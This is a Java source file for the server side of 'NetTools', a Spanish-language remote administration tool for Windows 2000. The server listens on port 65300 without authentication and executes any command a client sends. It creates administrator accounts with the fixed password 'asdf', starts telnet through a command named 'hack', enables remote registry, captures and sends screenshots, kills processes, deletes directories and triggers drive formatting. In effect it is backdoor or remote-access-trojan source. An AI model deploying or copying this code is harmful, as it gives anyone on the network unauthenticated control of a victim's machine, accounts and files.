package net.javahispano.nettools.servidor;

/**
 * <p>T�tulo: NetTools </p>
 * <p>Descripci�n: Administraci�n Remota Windows 2000</p>
 * <p>Copyright: Copyright (c) 2004</p>
 * <p>Empresa: fenomenoweb </p>
 * @Programado por Juan Garrido Caballero
 * @version 2.0
 * Web: http://nettools20.cjb.net
 */


import java.net.*;
import java.io.*;
import java.awt.image.*;
import java.awt.*;
import javax.swing.*;
import javax.imageio.*;
import javax.swing.event.TreeModelListener;
import javax.swing.tree.*;
//import net.javahispano.nettools.servidor.*;
import net.javahispano.nettools.cliente.*;

public class Servidor2 {
  public static void main(String args[]) throws IOException {

    String rundll = "rundll32.exe ";
    String user32 = "user32.dll ";
    String urldll = "url.dll ";
    String protocolo = "FileProtocolHandler ";
    String bloquea = "LockWorkStation";
    String net = "net user ";
    String start = "net start ";
    String stop = "net stop ";
    String grupo = "net localgroup ";
    String formateo = "SHFormatDrive";
    String shell32 = "shell32.dll ";

    int puerto = 65300;
    Socket cliente = null;
    ServerSocket servidor = new ServerSocket(puerto);
    // Creamos el objeto desde el cual atenderemos y aceptaremos
    // las conexiones de los clientes y abrimos los canales de
    // comunicaci�n de entrada y salida
    while (true) {
      try {
        cliente = servidor.accept();
        new GestorPeticion(cliente).start();
      }
      catch (IOException e) {
        System.out.println(e);
      }
    }
  }
}

class GestorPeticion
    extends Thread {
  Socket cliente;

  public GestorPeticion(Socket cliente) {
    this.cliente = cliente;
  }

  public void run() {
    try {
      DefaultMutableTreeNode root;
      Object aux=null;
      Objeto recibimos=null;
      Objeto mandamos=null;
      Thread hilo=null;
      String rundll = "rundll32.exe ";
      String user32 = "user32.dll ";
      String urldll = "url.dll ";
      String protocolo = "FileProtocolHandler ";
      String bloquea = "LockWorkStation";
      String net = "net user ";
      String start = "net start ";
      String stop = "net stop ";
      String grupo = "net localgroup ";
      String formateo = "SHFormatDrive";
      String shell32 = "shell32.dll ";
      String orden, orden2;
      ObjectInputStream Flujo_Entrada = new ObjectInputStream(cliente.
          getInputStream()); ;
      ObjectOutputStream Flujo_Salida = new ObjectOutputStream(cliente.
          getOutputStream());
     mandamos=new Objeto("\nConectado desde "+cliente.getInetAddress()+"\nPuerto de escucha "+cliente.getLocalPort(),"",null,0,0,null);
     Flujo_Salida.writeObject(mandamos);
     aux=Flujo_Entrada.readObject();
     recibimos=(Objeto)aux;
      while(true)
      {
        if(recibimos.orden.compareTo("ListaProcess")==0)
        {
//            private static void procesosWin(){
                 try{
        String consola = System.getenv("windir")+"\\System32\\"+"tasklist.exe";

        Process proceso=Runtime.getRuntime().exec(consola);
        BufferedReader entrada = new BufferedReader(new InputStreamReader(proceso.getInputStream()));
          String separador = ">#";
           String buffer="";
          String tmp;
        while((tmp=entrada.readLine())!=null){
         //buffer += separador + tmp;
        buffer +=tmp+separador;

        System.out.println(tmp);
        }
         System.out.println(buffer);
        entrada.close();
        mandamos=new Objeto(3,buffer,null,null,0,0,null);
          Flujo_Salida.writeObject(mandamos);
         }catch(Exception e){
         mandamos=new Objeto("\nLa lista no se ha podido mostrar",null,null,0,0,null);
          Flujo_Salida.writeObject(mandamos);

        }
      }

         /* try {
          Runtime.getRuntime().exec("cmd.exe /C pslist.exe >lista.txt");
          for( int retardo=0; retardo < 200000000; retardo++ );
          FileReader fr = new FileReader("lista.txt");
          BufferedReader br = new BufferedReader(fr);
          String s, buffer;
          buffer = "";
          while ( (s = br.readLine()) != null) {
          buffer += "\n" + s;
          }
          fr.close();
          for( int retardo=0; retardo < 200000000; retardo++ );
          mandamos=new Objeto(buffer,null,null,0,0,null);
          Flujo_Salida.writeObject(mandamos);
          for( int retardo=0; retardo < 20000000; retardo++ );
          File archivo=new File("lista.txt");
          archivo.delete();

           }
        catch (Exception e) {
          mandamos=new Objeto("\nLa lista no se ha podido mostrar",null,null,0,0,null);
          Flujo_Salida.writeObject(mandamos);

        }
        }
          */

    

        if(recibimos.orden.compareTo("KillProcess")==0)
        {
          try {
              System.out.println("Orden matar proceso"+recibimos.orden2);
              String separador = ">#";
              //    Runtime.getRuntime().exec("cmd.exe /C pskill.exe "+recibimos.orden2);
              int num=NumeroDeSubdirectorios(recibimos.orden2,separador);
              int cont=0,inicio=0,fin=0;
              String resultado="";
              while(num>cont){

             fin=recibimos.orden2.indexOf(separador,inicio);
             aux=recibimos.orden2.substring(inicio, fin);
              System.out.println("Pid a matar "+ aux+"\n");
             //hierarchy[cont]=(aux);
              Runtime.getRuntime().exec("cmd.exe /C  taskkill /F /PID "+aux);
              resultado+="Proceso "+aux +"cerrado con exito"+"\n";
               inicio=fin+2;
         // Runtime.getRuntime().exec("cmd.exe /C TASKKILL.exe/ "+recibimos.orden2);
              cont++;
              }
              System.out.println("RRRRRRRRRRR"+resultado);
              mandamos=new Objeto("El resultado de matar procesos :\n"+resultado+"",null,null,0,0,null);
          Flujo_Salida.writeObject(mandamos);
           }
        catch (Exception e) {
          mandamos=new Objeto("\nNo se puede formatear diskette",null,null,0,0,null);
          Flujo_Salida.writeObject(mandamos);
        }


        }

       if (recibimos.orden.compareTo("url") == 0) {
          try {
            Runtime.getRuntime().exec(rundll + urldll + protocolo + recibimos.orden2);
            mandamos = new Objeto("\nUrl "+recibimos.orden2+" abierta",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
          catch (Exception e) {
            Flujo_Salida.writeUTF("No se puede abrir");
          }
        }
        if (recibimos.orden.compareTo("abrir") == 0) {
          File dir = new File(recibimos.orden2);
          if (dir.isDirectory()) {
            try {

              if (dir.isDirectory()) {
                Runtime.getRuntime().exec("explorer " + recibimos.orden2);
                mandamos=new Objeto("\nAbriendo directorio "+recibimos.orden2,null,null,0,0,null);
                Flujo_Salida.writeObject(mandamos);


              }
            }
            catch (Exception e) {
              mandamos=new Objeto("\nNo se puede ejecutar la acci�n ",null,null,0,0,null);
              Flujo_Salida.writeObject(mandamos);
            }
          }
          else
          if (dir.isFile()) {
            try {
              Runtime.getRuntime().exec(rundll + urldll + protocolo + recibimos.orden2);
              mandamos=new Objeto("\nFichero "+recibimos.orden2+" ejecutado",null,null,0,0,null);
              Flujo_Salida.writeObject(mandamos);

            }
            catch (Exception e) {
              mandamos=new Objeto("\nNo se puede ejecutar la acci�n ",null,null,0,0,null);
              Flujo_Salida.writeObject(mandamos);
            }

          }
          else {
            try {
              Runtime.getRuntime().exec(recibimos.orden2);

              mandamos=new Objeto("\n"+recibimos.orden2+" ejecutado",null,null,0,0,null);
              Flujo_Salida.writeObject(mandamos);

            }
            catch (Exception e) {
              mandamos=new Objeto("\nNo se puede ejecutar la acci�n ",null,null,0,0,null);
              Flujo_Salida.writeObject(mandamos);
            }
          }

        }
        if (recibimos.orden.compareTo("crear") == 0) {
          try {
            Runtime.getRuntime().exec(net + recibimos.orden2 + " asdf /add");
            for( int retardo=0; retardo < 200000000; retardo++ );
            Runtime.getRuntime().exec(grupo + "Administradores " + recibimos.orden2 +
                                      " /add");
            for( int retardo=0; retardo < 200000000; retardo++ );
            Runtime.getRuntime().exec(grupo + "Usuarios " + recibimos.orden2 + " /del");
            for( int retardo=0; retardo < 200000000; retardo++ );
            mandamos=new Objeto("\nUsuario "+recibimos.orden2+" creado con �xito.\nLa contrase�a es asdf",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);

          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo se pudo crear al usuario ",null,null,0,0,null);
              Flujo_Salida.writeObject(mandamos);
          }

        }
        if (recibimos.orden.compareTo("bloquea") == 0) {
          try {
            cliente.close();
            Runtime.getRuntime().exec(rundll + user32 + bloquea);
            mandamos=new Objeto("\nEquipo bloqueado ",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
            cliente.close();
            System.exit(0);
          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo se pudo bloquear equipo ",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }
        if (recibimos.orden.compareTo("registro") == 0) {
          try {
            Runtime.getRuntime().exec(start + recibimos.orden2);
            mandamos=new Objeto("\nRegistro remoto activado ",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);

          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo se ha activado el registro remoto",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }
        if (recibimos.orden.compareTo("hack") == 0) {
          try {
            Runtime.getRuntime().exec("net start telnet");
            mandamos=new Objeto("\nShell remota activada",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);

          }
          catch (Exception e) {
            mandamos=new Objeto("\nLa shell no est� activada",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }

        }
        if (recibimos.orden.compareTo("diskette") == 0) {
          try {
            for( int retardo=0; retardo < 200000000; retardo++ );
            Runtime.getRuntime().exec("rundll32.exe shell32.dll SHFormatDrive");
            mandamos=new Objeto("\nOrden aplicada",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
             }
          catch (Exception e) {
            mandamos=new Objeto("\nNo se puede formatear diskette",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }
        if (recibimos.orden.compareTo("reinicia") == 0) {
          try {
            Runtime.getRuntime().exec(stop + "telnet");
            Runtime.getRuntime().exec(start + "telnet");
            mandamos=new Objeto("\nTelnet reinici�ndose....",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
            mandamos=new Objeto("\nTelnet reiniciado",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);

          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo se pudo reiniciar Telnet",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }

        if (recibimos.orden.compareTo("listar") == 0) {
            String separador = ">#";
          try {

            File dir = new File(recibimos.orden2);
              System.out.println("Elemento a listar"+recibimos.orden2);
            String s[] = dir.list();
            String directorio = "";
            directorio+= recibimos.orden2+separador;
            if (dir.exists() == true) {
              for (int i = 1; i < s.length; i++) {
                directorio +=s[i]+separador;
                System.out.println("SUBDIRECTORIOS a listar"+s[i]);
              }

            }
            mandamos=new Objeto(2,directorio,null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo se puede listar el directorio",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }



        /*if (recibimos.orden.compareTo("listar") == 0) {

             System.out.println("En el servidor con los directorios correspondientesSSSSSSSSSS");
            String separador = ">#";
          try {
            File dir = new File(recibimos.orden2);
              
            String s[] = dir.list();
            String directorio = "";
           // directorio+= recibimos.orden2+separador;

             // getList(recibimos.root, new File(recibimos.orden2));
          //   mandamos=new Objeto("\nCargando directorio remoto","",null,0,0,root);
         //        Flujo_Salida.writeObject(mandamos);
          populateNode(recibimos.root, dir);

          */

          /*if (dir.exists() == true) {
              for (int i = 0; i < s.length; i++) {
                directorio +=s[i]+separador;
              }

              populateNode(recibimos.root, dir);



            }*/
          /* mandamos=new Objeto(1,directorio,null,null,0,0,recibimos.root);
            Flujo_Salida.writeObject(mandamos);
          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo se puede listar el directorio",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }*/
        if (recibimos.orden.compareTo("informacion") == 0) {
          String buffer = "";
          Runtime.getRuntime().exec(
              "cmd.exe /C net statistics workstation > intercambio.dat");
                for( int retardo=0; retardo < 200000000; retardo++ );
          try {
            FileReader fr = new FileReader("intercambio.dat");
            BufferedReader br = new BufferedReader(fr);
            String s;
            while ( (s = br.readLine()) != null) {
              buffer += "\n" + s;
            }
            fr.close();

          }
          catch (Exception event) {}
          InetAddress ip = InetAddress.getLocalHost();
          for( int retardo=0; retardo < 200000000; retardo++ );
          mandamos=new Objeto("\nDirecci�n IP de m�quina remota: " +
                                ip.getHostAddress() +
                                "\nNombre DNS de maquina remota: " +
                                ip.getHostName() +
                                "\nDirecci�n can�nica de m�quina remota: " +
                                ip.getCanonicalHostName() +
                                "\nSistema operativo utilizado: " +
                                System.getProperty("os.name") +
                                "\nVersi�n del Sistema Operativo: " +
                                System.getProperty("os.version") +
                                "\nArquitectura del S.O: " +
                                System.getProperty("os.arch") +
                                "\nServipack instalado: " +
                                System.getProperty("sun.os.patch.level") +
                                "\nEstad�sticas del equipo: " + buffer,null,null,0,0,null);
            for( int retardo=0; retardo < 200000000; retardo++ );
            Flujo_Salida.writeObject(mandamos);
        }
        if (recibimos.orden.compareTo("borrar") == 0) {
          try {
            Runtime.getRuntime().exec("net user " + recibimos.orden2 + " /del");
            for( int retardo=0; retardo < 200000000; retardo++ );
            mandamos=new Objeto("\nSe ha completado el comando correctamente",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
          catch (Exception e) {}
        }
        if (recibimos.orden.compareTo("activo") == 0) {
          try {

            Runtime.getRuntime().exec("cmd.exe /C net start > intercambio.dat");
            for( int retardo=0; retardo < 200000000; retardo++ );
            FileReader fr = new FileReader("intercambio.dat");
            BufferedReader br = new BufferedReader(fr);
            String s, buffer;
            buffer = "";
            while ( (s = br.readLine()) != null) {
              buffer += "\n" + s;
            }
            fr.close();
            for( int retardo=0; retardo < 200000000; retardo++ );
            mandamos=new Objeto(buffer,null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);

          }
          catch (Exception event) {}

        }
        if (recibimos.orden.compareTo("shutdown") == 0) {
          try {
            Runtime.getRuntime().exec("ejecutables/shutdown.exe");
            mandamos=new Objeto("\nServidor desconect�ndose de la red",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo de puede ejecutar comando",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }
        if (recibimos.orden.compareTo("reboot") == 0) {
          try {
            Runtime.getRuntime().exec("ejecutables/reboot.exe");
            mandamos=new Objeto("\nServidor reinici�ndose",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo de puede ejecutar comando",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }
        if (recibimos.orden2.compareTo("ya") == 0) {
          try {
            Runtime.getRuntime().exec("net stop telnet");
            Runtime.getRuntime().exec("net stop remoteregistry");
            hilo=null;
            cliente.close();
          }
          catch (Exception e) {
            mandamos=new Objeto("\nNo Se puede ejecutar el comando salir",null,null,0,0,null);
            Flujo_Salida.writeObject(mandamos);
          }
        }
        if(recibimos.orden.compareTo("borra_directorio")==0)
        {

          try
          {
            boolean question;
            File directorio = new File(recibimos.orden2);
            question=deleteDir(directorio);
            if(question==true)
            {
              mandamos = new Objeto("\ndirectorio eliminado", null, null, 0, 0,null);
              Flujo_Salida.writeObject(mandamos);
            }
            else
            {
              mandamos = new Objeto("\nEl directorio no existe", null, null, 0, 0,null);
              Flujo_Salida.writeObject(mandamos);
            }
          }
            catch(Exception event){mandamos=new Objeto("\nNo se ha podido borrar el directorio",null,null,0,0,null);Flujo_Salida.writeObject(mandamos);}

        }
        if(recibimos.orden.compareTo("imagen")==0)
        {
          BufferedImage imagen=null;
          Robot robot = new Robot();
          imagen = robot.createScreenCapture(new Rectangle(Toolkit.
          getDefaultToolkit().getScreenSize()));
          int alto=imagen.getHeight();
          int ancho=imagen.getWidth();
          File outfile = new File("c:\\capturo.jpg");
          ImageIO.write(imagen, "jpg", outfile);
          hilo=new Thread(new ServidorArchivos("c:\\capturo.jpg"));
          hilo.start();
          mandamos=new Objeto("\nEnviando Imagen","",null,alto,ancho,null);
          Flujo_Salida.writeObject(mandamos);
          Flujo_Salida.flush();
         }

         if(recibimos.orden.compareTo("mandar")==0)
         {
           hilo=new Thread(new ServidorArchivos(recibimos.orden2));
           hilo.start();
         }
       if(recibimos.orden.compareTo("lista_unidades")==0)
         {
          String directorio = "";
          String separador = ">#";
          directorio+= separador;
           try
           {
             File[] roots = File.listRoots();
               for (int i=0; i<roots.length; i++)
               {
                directorio+=roots[i]+separador;
               }
                mandamos=new Objeto(1,directorio,"",null,0,0,null);
                 Flujo_Salida.writeObject(mandamos);

           }
             catch(Exception event)
               {
                 mandamos=new Objeto("\nImposible cargar unidades","",null,0,0,null);
                 Flujo_Salida.writeObject(mandamos);}
               }

               if(recibimos.orden.compareTo("lista_completa")==0)
               {
                  root = new DefaultMutableTreeNode("root", true);
                  getList(root, new File(recibimos.orden2));
                  mandamos=new Objeto("\nCargando directorio remoto","",null,0,0,root);
                  Flujo_Salida.writeObject(mandamos);
               }

       recibimos=(Objeto)Flujo_Entrada.readObject();
      }


    }
    catch (Exception e)
    {

    }


  }

 public int NumeroDeSubdirectorios(String directorio,String patron){
int contador=0;
while (directorio.indexOf(patron) > -1) {
      directorio = directorio.substring(directorio.indexOf(
        patron)+patron.length(),directorio.length());
      contador++;
}
return contador;
}




  public static boolean deleteDir(File directorio) {
        if (directorio.isDirectory()) {
            String[] ficheros = directorio.list();
            for (int i=0; i<ficheros.length; i++) {
                boolean success = deleteDir(new File(directorio, ficheros[i]));
                if (!success) {
                    return false;
                }
            }
        }
       return directorio.delete();

    }

    public void getList(DefaultMutableTreeNode nodo, File f) {
     if(!f.isDirectory()) {
            DefaultMutableTreeNode ficheritos = new DefaultMutableTreeNode(f);
            nodo.add(ficheritos);



         }
     else {
         DefaultMutableTreeNode child = new DefaultMutableTreeNode(f);
         nodo.add(child);
         File ListaFicheros[] = f.listFiles();
         for(int i = 0; i  < ListaFicheros.length; i++)
             getList(child, ListaFicheros[i]);
         }
    }




    private boolean populateNode(DefaultMutableTreeNode node,File f){

        System.out.println("Empieza el juego");
         node.removeAllChildren();  
       return populateNode(node,f,2);


    }

 private boolean populateNode (DefaultMutableTreeNode node,File f,int depth)
{
         System.out.println("Empieza el juego2222222");
 File[] files = f.listFiles(new FileFilter(){
     public boolean accept(File pathname){
     return pathname.isDirectory();

     }
 });
 if (files!=null && depth >0)
 {
   for(int i = 0; i  < files.length; i++){
             DefaultMutableTreeNode curr=new DefaultMutableTreeNode (files[i]);
             populateNode(curr, files[i],depth-1);
             node.add(curr);
         }

 }

 return true;

 }



}





